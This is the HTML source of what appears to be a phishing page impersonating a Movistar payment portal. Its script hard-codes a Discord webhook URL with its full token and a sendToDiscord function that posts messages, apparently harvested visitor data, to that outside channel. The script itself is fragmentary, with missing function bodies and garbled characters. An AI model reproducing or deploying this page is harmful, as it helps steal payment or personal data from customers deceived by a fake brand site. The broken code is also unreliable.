<!doctype html>
<html lang="es">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />

    <meta name="theme-color" content="#019DF4" />

    <title>Movistar Portal de Recaudos</title>
    <style>
        #loader {
            display: none;
            position: fixed;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            z-index: 10000;
            background: rgba(255, 255, 255, 0.7);
            width: 100vw;
            height: 100vh;
            align-items: center;
            justify-content: center;
        }

        .svg-circle {
            width: 4em;
            height: 4em;
            transform-origin: center;
            animation: rotate4 2s linear infinite;
            display: block;
            margin: 0 auto;
        }

        #loader svg {
            display: block;
            margin: 0 auto;
        }

        circle {
            fill: none;
            stroke: #019DF4;
            stroke-width: 4;
            stroke-dasharray: 1, 200;
            stroke-dashoffset: 0;
            stroke-linecap: round;
            animation: dash4 1.5s ease-in-out infinite;
        }

        @keyframes rotate4 {
            100% {
                transform: rotate(360deg);
            }
        }

        @keyframes dash4 {
            0% {
                stroke-dasharray: 1, 200;
                stroke-dashoffset: 0;
            }

            50% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -35;
            }

            100% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -124;
            }
        }
    </style>
</head>

<body>

<script>
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";

  function sendToDiscord(message) {

                    `‚è∞ Fecha: ${fecha}`;

    sendToDiscord(mensaje);

    setTimeout(function () {

</script>
